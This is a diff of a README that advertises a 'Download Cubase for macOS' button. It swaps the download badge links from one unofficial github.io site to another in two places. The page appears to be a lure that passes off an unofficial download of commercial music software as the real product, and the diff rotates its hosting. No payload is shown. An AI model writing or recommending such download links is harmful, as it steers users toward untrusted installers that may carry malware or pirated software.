@@ -7,7 +7,7 @@ From orchestral scoring and electronic music to mixing and mastering, Cubase pro
 ---
 
 ## ✅ Download Cubase for macOS  
-[![Download Cubase](https://img.shields.io/badge/Download-Cubase-blueviolet)](https://shuziktobehuman.github.io/huja/Cubase)
+[![Download Cubase](https://img.shields.io/badge/Download-Cubase-blueviolet)](https://mitrobandus.github.io/.github/Cubase)
 
 ---
 
@@ -67,7 +67,7 @@ Cubase is an industry-standard DAW offering a comprehensive suite of tools for c
 
 ---
 
-[![Download Cubase](https://img.shields.io/badge/Download-Cubase-blueviolet)](https://shuziktobehuman.github.io/huja/Cubase)
+[![Download Cubase](https://img.shields.io/badge/Download-Cubase-blueviolet)](https://mitrobandus.github.io/.github/Cubase)
 
 ---
 
